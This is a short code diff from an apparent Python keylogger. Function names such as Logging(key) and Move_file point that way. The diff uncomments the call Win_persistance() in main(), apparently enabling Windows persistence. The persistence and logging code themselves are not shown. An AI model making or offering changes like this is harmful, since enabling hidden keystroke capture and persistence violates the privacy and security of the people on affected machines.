@@ -141,7 +141,7 @@ def Logging(key):
 
 def main():
     Move_file()
-    #Win_persistance()
+    Win_persistance()
     t1 = threading.Thread(target=Check_file)
     t2 = threading.Thread(target=window)
     t2.daemon = True
